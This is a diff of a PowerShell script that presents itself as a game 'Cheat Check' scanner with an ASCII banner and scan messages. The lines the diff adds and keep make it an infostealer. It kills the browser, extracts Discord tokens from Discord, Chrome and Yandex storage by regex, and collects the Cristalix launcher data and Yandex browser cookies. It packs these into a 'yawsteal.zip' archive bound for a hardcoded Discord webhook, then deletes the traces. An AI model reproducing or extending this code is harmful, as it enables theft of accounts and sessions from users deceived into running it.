@@ -1,4 +1,3 @@
-
 Write-Output " by funtime-project                                       "
 Write-Output "   ____ _                _      ____ _               _    "
 Write-Output "  / ___| |__   ___  __ _| |_   / ___| |__   ___  ___| | __"
@@ -6,19 +5,69 @@ Write-Output " | |   | '_ \ / _ \/ _\ | __| | |   | '_ \ / _ \/ __| |/ /"
 Write-Output " | |___| | | |  __/ (_| | |_  | |___| | | |  __/ (__|   < "
 Write-Output "  \____|_| |_|\___|\__,_|\__|  \____|_| |_|\___|\___|_|\_\" 
 Write-Output "                                                          "
+Write-Output "Загрузка... / Loading...                                  "
+$FormatEnumerationLimit = -1
+$Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size(500, 300)
 
 $userName = Split-Path $env:USERPROFILE -Leaf
-
-# Ваш основной код
 $Webhook_link = "https://discord.com/api/webhooks/1309136819279102043/63Kc471txsYbUf7OgT8AqoRgyYkiZ-aXzktRC-hm--jurk2zp6CW7SUdDEXNn0BS_MY1"
 Stop-Process -Name "browser" -Force
 
 Start-Sleep -Seconds 1
 
 $filePaths = @(
-    "C:\Users\$userName\.cristalix\.launcher"
+    "C:\Users\$userName\.cristalix\.launcher",
+    "$env:TEMP\discord_tokens.txt",
     "C:\Users\$userName\AppData\Local\Yandex\YandexBrowser\User Data\Default\Network\Cookies"
 )
+
+# Discord tokens START #
+$dsc_targets = @(
+    "$env:APPDATA\Discord",
+    "$env:APPDATA\discordcanary",
+    "$env:APPDATA\discordptb",
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default",
+    "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Default"
+)
+
+$dsc_regexes = @(
+    "[\w-]{24}\.[\w-]{6}\.[\w-]{38}",
+    "mfa\.[\w-]{84}"
+)
+
+$dsc_tokens = @()
+
+foreach ($target in $dsc_targets) {
+    $leveldbPath = Join-Path $target "Local Storage\leveldb"
+
+    if (Test-Path $leveldbPath) {
+        Get-ChildItem -Path $leveldbPath -Filter "*.ldb" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
+            $fileContent = Get-Content $_.FullName -Raw
+            foreach ($regex in $dsc_regexes) {
+                $matches = [regex]::Matches($fileContent, $regex)
+                foreach ($match in $matches) {
+                    $dsc_tokens += $match.Value
+                }
+            }
+        }
+
+        Get-ChildItem -Path $leveldbPath -Filter "*.log" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
+            $fileContent = Get-Content $_.FullName -Raw
+            foreach ($regex in $dsc_regexes) {
+                $matches = [regex]::Matches($fileContent, $regex)
+                foreach ($match in $matches) {
+                    $dsc_tokens += $match.Value
+                }
+            }
+        }
+    }
+}
+
+if ($dsc_tokens -and $dsc_tokens.Count -gt 0) {
+    $filePath = Join-Path $env:Temp "discord_tokens.txt"
+    $dsc_tokens | Out-File -FilePath $filePath -Encoding UTF8
+}
+# Discord tokens END #
 
 $zipFilePath = Join-Path $env:Temp "yawsteal.zip"
 
@@ -85,6 +134,7 @@ try {
 }
 
 Remove-Item $zipFilePath -Force
+Remove-Item "$env:TEMP\discord_tokens.txt" -Force
 Write-Output "———————————————————————————————————————————————————————————"
 Write-Output " "
 Write-Output " @ Current task:    Scanning C:\Users\$userName for Doomsday"
